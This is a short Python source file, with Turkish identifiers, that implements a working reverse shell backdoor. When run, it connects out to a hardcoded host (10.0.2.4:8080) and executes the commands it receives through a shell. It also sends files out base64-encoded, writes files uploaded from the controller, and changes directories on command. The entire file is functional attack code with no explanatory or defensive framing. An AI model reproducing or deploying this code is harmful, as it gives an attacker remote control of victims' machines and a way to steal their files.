import socket as sc
import subprocess
import os
import base64

class Socket_Recv_Bind:

    def __init__(self,ip,port):
        self.my_connection=sc.socket(sc.AF_INET,sc.SOCK_STREAM)
        self.my_connection.connect((ip,port))

    def komut_al(self,command):
        return subprocess.check_output(command,shell=True)

    def change_dir(self,command):
        os.chdir(command)
        return "Cd to "+command

    def download_dir(self,command):
        with open(command,"rb") as my_file:
            return base64.b64encode(my_file.read())

    def dosya_kaydet(self,path,command):
        with open(path,"wb") as my_file:
            my_file.write(base64.b64decode(command))
        return "Download ok..."

    def start_con(self):
        while True:
            try:
                veri=self.my_connection.recv(1024)
                veri=veri.decode()
                l_veri=list(veri.split(" "))

                if l_veri[0]=="exit":
                    exit()
                elif l_veri[0]=="cd" and len(l_veri)>1:
                    veri=self.change_dir(l_veri[1])
                elif l_veri[0]=="download":
                    veri=self.download_dir(l_veri[1])
                elif l_veri[0]=="upload":
                    veri1=self.dosya_kaydet(l_veri[1],l_veri[2])
                    veri=veri1.encode()
                else:
                    veri=self.komut_al(veri)
                self.my_connection.send(veri)
            except:
                self.my_connection.send("Enter right command !!!".encode())


connection=Socket_Recv_Bind("10.0.2.4",8080)
connection.start_con()